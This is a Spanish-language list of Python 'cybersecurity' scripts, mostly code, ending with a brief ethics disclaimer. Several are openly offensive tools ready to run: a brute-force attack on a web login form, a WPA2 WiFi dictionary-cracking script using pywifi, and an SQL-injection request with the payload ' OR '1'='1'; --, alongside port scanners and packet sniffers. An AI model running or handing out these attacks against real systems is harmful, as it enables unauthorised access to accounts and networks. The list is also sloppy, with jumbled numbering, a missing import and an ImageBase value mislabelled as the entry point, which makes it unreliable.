Varios scripts interesantes en Python que son útiles para tareas relacionadas con la ciberseguridad. Aquí hay algunos ejemplos:

1. **Escaneo de Puertos con `socket`**:
   Este script utiliza la biblioteca `socket` para escanear puertos en una dirección IP específica.

   ```python
   import socket
   
   target = input("Ingrese la dirección IP a escanear: ")
   
   try:
       for port in range(1, 1025):
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           socket.setdefaulttimeout(1)
           
           resultado = s.connect_ex((target, port))
           if resultado == 0:
               print("Puerto {}: Abierto".format(port))
           s.close()
   
   except KeyboardInterrupt:
       print("\nEscaneo detenido.")
   except socket.gaierror:
       print("El nombre del host no pudo ser resuelto.")
   except socket.error:
       print("No se pudo conectar al servidor.")
   ```

2. **Fuerza Bruta para Inicios de Sesión con `requests`**:
   Este script intenta realizar un ataque de fuerza bruta a un formulario de inicio de sesión usando la biblioteca `requests`.

   ```python
   import requests
   
   target_url = "http://example.com/login"
   data_dict = {"username": "admin", "password": "", "login": "submit"}
   
   with open("passwords.txt", "r") as wordlist_file:
       for line in wordlist_file:
           word = line.strip()
           data_dict["password"] = word
           response = requests.post(target_url, data=data_dict)
           if "Login failed" not in response.content.decode():
               print("[+] Contraseña encontrada: {}".format(word))
               break
   ```

3. **Sniffing de Paquetes con `scapy`**:
   `Scapy` es una poderosa herramienta para manipulación y captura de paquetes de red. Puedes realizar operaciones como sniffing, enviar paquetes personalizados, etc.

   ```python
   from scapy.all import *
   
   def packet_callback(packet):
       if packet.haslayer(HTTPRequest):
           print(packet.show())
   
   sniff(prn=packet_callback, store=0)
   ```

4. **Análisis de Archivos PE (Windows) con `pefile`**:
   `pefile` es una biblioteca que te permite leer información de archivos ejecutables de Windows (PE files). Puedes utilizarla para analizar malware o entender mejor los binarios de Windows.

   ```python
   import pefile
   
   pe = pefile.PE("archivo_ejecutable.exe")
   
   print("Dirección de entrada: 0x%x" % pe.OPTIONAL_HEADER.ImageBase)
   
   for section in pe.sections:
       print(section.Name, hex(section.VirtualAddress), hex(section.Misc_VirtualSize), section.SizeOfRawData)
   ```

5. **Ataque de Diccionario de WiFi con `pywifi`**:
   `pywifi` te permite interactuar con dispositivos WiFi. Este script intenta realizar un ataque de diccionario a una red WiFi.

   ```python
   import pywifi
   from pywifi import const
   import time
   
   wifi = pywifi.PyWiFi()
   iface = wifi.interfaces()[0]
   
   def connect_wifi(ssid, password):
       iface.scan()
       time.sleep(2)
       scan_results = iface.scan_results()
       for result in scan_results:
           if result.ssid == ssid:
               profile = pywifi.Profile()
               profile.ssid = ssid
               profile.auth = const.AUTH_ALG_OPEN
               profile.akm.append(const.AKM_TYPE_WPA2PSK)
               profile.cipher = const.CIPHER_TYPE_CCMP
               profile.key = password
               iface.remove_all_network_profiles()
               temp_profile = iface.add_network_profile(profile)
               iface.connect(temp_profile)
               time.sleep(5)
               if iface.status() == const.IFACE_CONNECTED:
                   return True
               else:
                   return False
   
   ssid = input("Ingrese el nombre de la red WiFi: ")
   wordlist = input("Ruta al archivo de diccionario: ")
   
   with open(wordlist, "r") as file:
       passwords = file.readlines()
       for password in passwords:
           password = password.strip()
           print("Probando: " + password)
           if connect_wifi(ssid, password):
               print("Contraseña encontrada: " + password)
               break
   ```

6. **Generador de Contraseñas Aleatorias**:
   Este script genera contraseñas aleatorias seguras.

   ```python
   import random
   import string
   
   length = 12
   password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))
   print(f"Contraseña generada: {password}")
   ```
   11. **Escaneo de Puertos con `socket`**:
    Este script realiza un escaneo de puertos en un host específico.

    ```python
    import socket
    
    target_host = "example.com"
    target_ports = [21, 22, 80, 443, 3389]  # Puedes agregar más puertos a la lista
    
    for port in target_ports:
        try:
            socket.setdefaulttimeout(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = s.connect_ex((target_host, port))
            if result == 0:
                print(f"Puerto {port} abierto")
            s.close()
        except KeyboardInterrupt:
            print("\nEscaneo de puertos cancelado")
            break
        except socket.error:
            print(f"No se pudo conectar al puerto {port}")
    ```


7. **Sniffing de Paquetes con `scapy`**:
    Este script captura paquetes de red en una interfaz específica.

    ```python
    from scapy.all import sniff
    
    def packet_handler(packet):
        print(packet.summary())
    
    interface = "eth0"  # Nombre de la interfaz de red, puede variar según tu sistema
    
    sniff(iface=interface, prn=packet_handler, count=10)  # Captura 10 paquetes
    ```

8. **Ataque de Inyección SQL con `requests`**:
    Este script realiza un ataque de inyección SQL en una URL vulnerable.

    ```python
    import requests
    
    target_url = "http://example.com/vulnerable.php?id=1"
    payload = "' OR '1'='1'; --"
    
    response = requests.get(target_url + payload)
    
    if "Error de SQL" in response.text:
        print("Vulnerabilidad de inyección SQL encontrada")
    else:
        print("No se encontró vulnerabilidad de inyección SQL")
    ```

8. **Escaneo de Vulnerabilidades con `Nmap`**:
    Este script utiliza la biblioteca `python-nmap` para realizar un escaneo de vulnerabilidades en un host.

    ```python
    import nmap
    
    target_host = "example.com"
    
    scanner = nmap.PortScanner()
    scanner.scan(target_host, arguments="-sV -O")
    
    for host in scanner.all_hosts():
        print(f"Host: {host}")
        print(f"Estado: {scanner[host].state()}")
        for proto in scanner[host].all_protocols():
            print(f"Protocolo: {proto}")
            ports = scanner[host][proto].keys()
            for port in ports:
                print(f"Puerto: {port}, Estado: {scanner[host][proto][port]['state']}")
    ```

Recuerda siempre utilizar estas herramientas y scripts de manera ética y en un entorno legal. El uso inadecuado de estas herramientas puede ser ilegal y violar la privacidad de otros.